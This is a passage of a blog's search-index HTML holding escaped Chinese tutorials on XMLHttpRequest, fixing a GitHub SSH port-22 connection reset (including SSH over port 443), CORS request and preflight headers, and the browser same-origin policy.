    if((xhr.status &amp;gt;= 200 &amp;amp;&amp;amp; xhr.status &amp;lt; 300) || xhr.status == 304){
      //do successCallback
    }
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;参考资料&#34;&gt;参考资料&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.w3.org/TR/XMLHttpRequest/&#34;&gt;w3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest&#34;&gt;MDN&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;h3 id=&#34;ruoyiqing&#34;&gt;ruoyiqing&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://segmentfault.com/a/1190000004322487&#34;&gt;https://segmentfault.com/a/1190000004322487&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
">61-http-13-XMLHttpRequest</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/github-lian-jie-cuo-wu-connection-reset-by-1322918859-port-22-ssh/"" data-c="
          &lt;h1 id=&#34;github-连接错误connection-reset-by-1322918859-port-22-ssh&#34;&gt;github-连接错误Connection reset by 13.229.188.59 port 22 ssh&lt;/h1&gt;
&lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;当你想连接GitHub提交时，发现无法提交，报错如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Connection reset by 13.229.188.59 port 22 ssh
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;解决&#34;&gt;解决&lt;/h2&gt;
&lt;p&gt;在Windows防火墙中设置22端口&lt;/p&gt;
&lt;p&gt;1、控制面板-系统和安全-Windows Defender防火墙-高级设置&lt;/p&gt;
&lt;p&gt;2、选择&lt;strong&gt;入站规则&lt;/strong&gt;-&lt;strong&gt;新建规则&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;3、选择&lt;strong&gt;端口&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;4、特定本地端口：输入&lt;strong&gt;22&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;5、选择&lt;strong&gt;允许连接&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;6、输入&lt;strong&gt;名称&lt;/strong&gt;和&lt;strong&gt;描述&lt;/strong&gt;，自定义，也可如下&lt;/p&gt;
&lt;p&gt;名称：22in&lt;/p&gt;
&lt;p&gt;描述：Connection reset by 13.229.188.59 port 22 ssh&lt;/p&gt;
&lt;h2 id=&#34;其他方法&#34;&gt;其他方法&lt;/h2&gt;
&lt;p&gt;更改防火墙禁掉的22端口，ssh本来使用的22，可以在https端口使用ssh&lt;/p&gt;
&lt;p&gt;1、要测试通过 HTTPS 端口的 SSH 是否可行，请运行以下 SSH 命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ ssh -T -p 443 git@ssh.github.com
&amp;gt; Hi username! You&#39;ve successfully authenticated, but GitHub does not
&amp;gt; provide shell access.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果这样有效，万事大吉！&lt;/p&gt;
&lt;p&gt;2、如果您能在端口 443 上通过 SSH 连接到 &lt;code&gt;git@ssh.github.com&lt;/code&gt;，则可以覆盖您的 SSH 设置以强制与 GitHub 的任何连接均通过该服务器和端口运行。&lt;/p&gt;
&lt;p&gt;要在您的 ssh 配置中设置此项，编辑位于 &lt;code&gt;~/.ssh/config&lt;/code&gt; 的文件，添加以下部分：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Host github.com
  Hostname ssh.github.com
  Port 443
  User git
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;您可以通过再次连接到 GitHub 测试此项是否有效：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ ssh -T git@github.com
&amp;gt; Hi username! You&#39;ve successfully authenticated, but GitHub does not
&amp;gt; provide shell access.
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;问题&#34;&gt;问题&lt;/h2&gt;
&lt;p&gt;当时解决了，但是第二天又不行了。怀疑是网络的问题，然后用我手机流量开热点，提交成功了。&lt;/p&gt;
&lt;h2 id=&#34;文档&#34;&gt;文档&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.github.com/cn/github/authenticating-to-github/troubleshooting-ssh/using-ssh-over-the-https-port&#34;&gt;https://docs.github.com/cn/github/authenticating-to-github/troubleshooting-ssh/using-ssh-over-the-https-port&lt;/a&gt;&lt;/p&gt;
">60-github-1-连接错误</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-kua-yu-cors/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;CORS是一个W3C标准，全称是&amp;quot;跨域资源共享&amp;quot;（Cross-origin resource sharing）。&lt;/p&gt;
&lt;p&gt;它允许浏览器向跨源服务器，发出&lt;a href=&#34;https://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html&#34;&gt;&lt;code&gt;XMLHttpRequest&lt;/code&gt;&lt;/a&gt;请求，从而克服了AJAX只能&lt;a href=&#34;https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html&#34;&gt;同源&lt;/a&gt;使用的限制。&lt;/p&gt;
&lt;h2 id=&#34;一-简介&#34;&gt;一、简介&lt;/h2&gt;
&lt;p&gt;CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。&lt;/p&gt;
&lt;p&gt;整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。&lt;/p&gt;
&lt;p&gt;因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。&lt;/p&gt;
&lt;h2 id=&#34;二-两种请求&#34;&gt;二、两种请求&lt;/h2&gt;
&lt;p&gt;浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。&lt;/p&gt;
&lt;p&gt;只要同时满足以下两大条件，就属于简单请求。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1) 请求方法是以下三种方法之一：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HEAD&lt;/li&gt;
&lt;li&gt;GET&lt;/li&gt;
&lt;li&gt;POST&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（2）HTTP的头信息不超出以下几种字段：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Accept&lt;/li&gt;
&lt;li&gt;Accept-Language&lt;/li&gt;
&lt;li&gt;Content-Language&lt;/li&gt;
&lt;li&gt;Last-Event-ID&lt;/li&gt;
&lt;li&gt;Content-Type：只限于三个值&lt;code&gt;application/x-www-form-urlencoded&lt;/code&gt;、&lt;code&gt;multipart/form-data&lt;/code&gt;、&lt;code&gt;text/plain&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;这是为了兼容表单（form），因为历史上表单一直可以发出跨域请求。AJAX 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。&lt;/p&gt;
&lt;p&gt;凡是不同时满足上面两个条件，就属于非简单请求。&lt;/p&gt;
&lt;p&gt;浏览器对这两种请求的处理，是不一样的。&lt;/p&gt;
&lt;h2 id=&#34;三-简单请求&#34;&gt;三、简单请求&lt;/h2&gt;
&lt;h3 id=&#34;31-基本流程&#34;&gt;3.1 基本流程&lt;/h3&gt;
&lt;p&gt;对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个&lt;code&gt;Origin&lt;/code&gt;字段。&lt;/p&gt;
&lt;p&gt;下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个&lt;code&gt;Origin&lt;/code&gt;字段。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;GET /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面的头信息中，&lt;code&gt;Origin&lt;/code&gt;字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。&lt;/p&gt;
&lt;p&gt;如果&lt;code&gt;Origin&lt;/code&gt;指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含&lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt;字段（详见下文），就知道出错了，从而抛出一个错误，被&lt;code&gt;XMLHttpRequest&lt;/code&gt;的&lt;code&gt;onerror&lt;/code&gt;回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。&lt;/p&gt;
&lt;p&gt;如果&lt;code&gt;Origin&lt;/code&gt;指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: FooBar
Content-Type: text/html; charset=utf-8
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面的头信息之中，有三个与CORS请求相关的字段，都以&lt;code&gt;Access-Control-&lt;/code&gt;开头。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1）Access-Control-Allow-Origin&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该字段是必须的。它的值要么是请求时&lt;code&gt;Origin&lt;/code&gt;字段的值，要么是一个&lt;code&gt;*&lt;/code&gt;，表示接受任意域名的请求。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（2）Access-Control-Allow-Credentials&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为&lt;code&gt;true&lt;/code&gt;，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为&lt;code&gt;true&lt;/code&gt;，如果服务器不要浏览器发送Cookie，删除该字段即可。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（3）Access-Control-Expose-Headers&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该字段可选。CORS请求时，&lt;code&gt;XMLHttpRequest&lt;/code&gt;对象的&lt;code&gt;getResponseHeader()&lt;/code&gt;方法只能拿到6个基本字段：&lt;code&gt;Cache-Control&lt;/code&gt;、&lt;code&gt;Content-Language&lt;/code&gt;、&lt;code&gt;Content-Type&lt;/code&gt;、&lt;code&gt;Expires&lt;/code&gt;、&lt;code&gt;Last-Modified&lt;/code&gt;、&lt;code&gt;Pragma&lt;/code&gt;。如果想拿到其他字段，就必须在&lt;code&gt;Access-Control-Expose-Headers&lt;/code&gt;里面指定。上面的例子指定，&lt;code&gt;getResponseHeader(&#39;FooBar&#39;)&lt;/code&gt;可以返回&lt;code&gt;FooBar&lt;/code&gt;字段的值。&lt;/p&gt;
&lt;h3 id=&#34;32-withcredentials-属性&#34;&gt;3.2 withCredentials 属性&lt;/h3&gt;
&lt;p&gt;上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定&lt;code&gt;Access-Control-Allow-Credentials&lt;/code&gt;字段。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Access-Control-Allow-Credentials: true
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;另一方面，开发者必须在AJAX请求中打开&lt;code&gt;withCredentials&lt;/code&gt;属性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。&lt;/p&gt;
&lt;p&gt;但是，如果省略&lt;code&gt;withCredentials&lt;/code&gt;设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭&lt;code&gt;withCredentials&lt;/code&gt;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;xhr.withCredentials = false;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;需要注意的是，如果要发送Cookie，&lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt;就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的&lt;code&gt;document.cookie&lt;/code&gt;也无法读取服务器域名下的Cookie。&lt;/p&gt;
&lt;h2 id=&#34;四-非简单请求&#34;&gt;四、非简单请求&lt;/h2&gt;
&lt;h3 id=&#34;41-预检请求&#34;&gt;4.1 预检请求&lt;/h3&gt;
&lt;p&gt;非简单请求是那种对服务器有特殊要求的请求，比如请求方法是&lt;code&gt;PUT&lt;/code&gt;或&lt;code&gt;DELETE&lt;/code&gt;，或者&lt;code&gt;Content-Type&lt;/code&gt;字段的类型是&lt;code&gt;application/json&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为&amp;quot;预检&amp;quot;请求（preflight）。&lt;/p&gt;
&lt;p&gt;浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的&lt;code&gt;XMLHttpRequest&lt;/code&gt;请求，否则就报错。&lt;/p&gt;
&lt;p&gt;下面是一段浏览器的JavaScript脚本。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var url = &#39;http://api.alice.com/cors&#39;;
var xhr = new XMLHttpRequest();
xhr.open(&#39;PUT&#39;, url, true);
xhr.setRequestHeader(&#39;X-Custom-Header&#39;, &#39;value&#39;);
xhr.send();
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面代码中，HTTP请求的方法是&lt;code&gt;PUT&lt;/code&gt;，并且发送一个自定义头信息&lt;code&gt;X-Custom-Header&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;浏览器发现，这是一个非简单请求，就自动发出一个&amp;quot;预检&amp;quot;请求，要求服务器确认可以这样请求。下面是这个&amp;quot;预检&amp;quot;请求的HTTP头信息。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;OPTIONS /cors HTTP/1.1
Origin: http://api.bob.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom-Header
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;quot;预检&amp;quot;请求用的请求方法是&lt;code&gt;OPTIONS&lt;/code&gt;，表示这个请求是用来询问的。头信息里面，关键字段是&lt;code&gt;Origin&lt;/code&gt;，表示请求来自哪个源。&lt;/p&gt;
&lt;p&gt;除了&lt;code&gt;Origin&lt;/code&gt;字段，&amp;quot;预检&amp;quot;请求的头信息包括两个特殊字段。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1）Access-Control-Request-Method&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是&lt;code&gt;PUT&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（2）Access-Control-Request-Headers&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是&lt;code&gt;X-Custom-Header&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&#34;42-预检请求的回应&#34;&gt;4.2 预检请求的回应&lt;/h3&gt;
&lt;p&gt;服务器收到&amp;quot;预检&amp;quot;请求以后，检查了&lt;code&gt;Origin&lt;/code&gt;、&lt;code&gt;Access-Control-Request-Method&lt;/code&gt;和&lt;code&gt;Access-Control-Request-Headers&lt;/code&gt;字段以后，确认允许跨源请求，就可以做出回应。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: X-Custom-Header
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Content-Length: 0
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面的HTTP回应中，关键的是&lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt;字段，表示&lt;code&gt;http://api.bob.com&lt;/code&gt;可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Access-Control-Allow-Origin: *
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果服务器否定了&amp;quot;预检&amp;quot;请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被&lt;code&gt;XMLHttpRequest&lt;/code&gt;对象的&lt;code&gt;onerror&lt;/code&gt;回调函数捕获。控制台会打印出如下的报错信息。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;XMLHttpRequest cannot load http://api.alice.com.
Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;服务器回应的其他CORS相关字段如下。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1728000
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;（1）Access-Control-Allow-Methods&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次&amp;quot;预检&amp;quot;请求。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（2）Access-Control-Allow-Headers&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果浏览器请求包括&lt;code&gt;Access-Control-Request-Headers&lt;/code&gt;字段，则&lt;code&gt;Access-Control-Allow-Headers&lt;/code&gt;字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在&amp;quot;预检&amp;quot;中请求的字段。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（3）Access-Control-Allow-Credentials&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该字段与简单请求时的含义相同。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（4）Access-Control-Max-Age&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。&lt;/p&gt;
&lt;h3 id=&#34;43-浏览器的正常请求和回应&#34;&gt;4.3 浏览器的正常请求和回应&lt;/h3&gt;
&lt;p&gt;一旦服务器通过了&amp;quot;预检&amp;quot;请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个&lt;code&gt;Origin&lt;/code&gt;头信息字段。服务器的回应，也都会有一个&lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt;头信息字段。&lt;/p&gt;
&lt;p&gt;下面是&amp;quot;预检&amp;quot;请求之后，浏览器的正常CORS请求。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;PUT /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
X-Custom-Header: value
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面头信息的&lt;code&gt;Origin&lt;/code&gt;字段是浏览器自动添加的。&lt;/p&gt;
&lt;p&gt;下面是服务器正常的回应。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Access-Control-Allow-Origin: http://api.bob.com
Content-Type: text/html; charset=utf-8
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面头信息中，&lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt;字段是每次回应都必定包含的。&lt;/p&gt;
&lt;h2 id=&#34;五-与jsonp的比较&#34;&gt;五、与JSONP的比较&lt;/h2&gt;
&lt;p&gt;CORS与JSONP的使用目的相同，但是比JSONP更强大。&lt;/p&gt;
&lt;p&gt;JSONP只支持&lt;code&gt;GET&lt;/code&gt;请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。&lt;/p&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阮一峰&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ruanyifeng.com/blog/2016/04/cors.html&#34;&gt;https://www.ruanyifeng.com/blog/2016/04/cors.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS&#34;&gt;MDN-CORS&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://juejin.cn/post/6844904126246027278&#34;&gt;10种跨域解决方案&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://segmentfault.com/a/1190000011145364&#34;&gt;前端常见跨域解决方案&lt;/a&gt;&lt;/p&gt;
">59-http-12-跨域CORS</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-kua-yu/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;**「同源策略」**是一个重要的安全策略，它用于限制一个&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Glossary/Origin&#34;&gt;origin&lt;/a&gt;的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。&lt;/p&gt;
&lt;p&gt;--来源 MDN&lt;/p&gt;
&lt;h2 id=&#34;一-概述&#34;&gt;一、概述&lt;/h2&gt;
&lt;h3 id=&#34;11-含义&#34;&gt;1.1 含义&lt;/h3&gt;
&lt;p&gt;1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。&lt;/p&gt;
&lt;p&gt;最初，它的含义是指，A网页设置的 Cookie，B网页不能打开，除非这两个网页&amp;quot;同源&amp;quot;。所谓&amp;quot;同源&amp;quot;指的是&amp;quot;三个相同&amp;quot;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;协议相同&lt;/li&gt;
&lt;li&gt;域名相同&lt;/li&gt;
&lt;li&gt;端口相同&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;举例来说，&lt;code&gt;http://www.example.com/dir/page.html&lt;/code&gt;这个网址，协议是&lt;code&gt;http://&lt;/code&gt;，域名是&lt;code&gt;www.example.com&lt;/code&gt;，端口是&lt;code&gt;80&lt;/code&gt;（默认端口可以省略）。它的同源情况如下。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;http://www.example.com/dir2/other.html&lt;/code&gt;：同源&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://example.com/dir/other.html&lt;/code&gt;：不同源（域名不同）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://v2.www.example.com/dir/other.html&lt;/code&gt;：不同源（域名不同）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://www.example.com:81/dir/other.html&lt;/code&gt;：不同源（端口不同）&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;12-目的&#34;&gt;1.2 目的&lt;/h3&gt;
&lt;p&gt;同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。&lt;/p&gt;
&lt;p&gt;设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？&lt;/p&gt;
&lt;p&gt;很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。&lt;/p&gt;
&lt;p&gt;由此可见，&amp;quot;同源政策&amp;quot;是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。&lt;/p&gt;
&lt;h3 id=&#34;13-限制范围&#34;&gt;1.3 限制范围&lt;/h3&gt;
&lt;p&gt;随着互联网的发展，&amp;quot;同源政策&amp;quot;越来越严格。目前，如果非同源，共有三种行为受到限制。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1） Cookie、LocalStorage 和 IndexDB 无法读取。&lt;/p&gt;
&lt;p&gt;（2） DOM 无法获得。&lt;/p&gt;
&lt;p&gt;（3） AJAX 请求不能发送。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面，我将详细介绍，如何规避上面三种限制。&lt;/p&gt;
&lt;h2 id=&#34;二-cookie&#34;&gt;二、Cookie&lt;/h2&gt;
&lt;p&gt;Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。但是，两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置&lt;code&gt;document.domain&lt;/code&gt;共享 Cookie。&lt;/p&gt;
&lt;p&gt;举例来说，A网页是&lt;code&gt;http://w1.example.com/a.html&lt;/code&gt;，B网页是&lt;code&gt;http://w2.example.com/b.html&lt;/code&gt;，那么只要设置相同的&lt;code&gt;document.domain&lt;/code&gt;，两个网页就可以共享Cookie。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;document.domain = &#39;example.com&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;现在，A网页通过脚本设置一个 Cookie。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;document.cookie = &amp;quot;test1=hello&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;B网页就可以读到这个 Cookie。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var allCookie = document.cookie;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexDB 无法通过这种方法，规避同源政策，而要使用下文介绍的PostMessage API。&lt;/p&gt;
&lt;p&gt;另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如&lt;code&gt;.example.com&lt;/code&gt;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Set-Cookie: key=value; domain=.example.com; path=/
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。&lt;/p&gt;
&lt;h2 id=&#34;三-iframe&#34;&gt;三、iframe&lt;/h2&gt;
&lt;p&gt;如果两个网页不同源，就无法拿到对方的DOM。典型的例子是&lt;code&gt;iframe&lt;/code&gt;窗口和&lt;code&gt;window.open&lt;/code&gt;方法打开的窗口，它们与父窗口无法通信。&lt;/p&gt;
&lt;p&gt;比如，父窗口运行下面的命令，如果&lt;code&gt;iframe&lt;/code&gt;窗口不是同源，就会报错。&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;document.getElementById(&amp;quot;myIFrame&amp;quot;).contentWindow.document
// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面命令中，父窗口想获取子窗口的DOM，因为跨源导致报错。&lt;/p&gt;
&lt;p&gt;反之亦然，子窗口获取主窗口的DOM也会报错。&lt;/p&gt;
&lt;blockquote&gt;
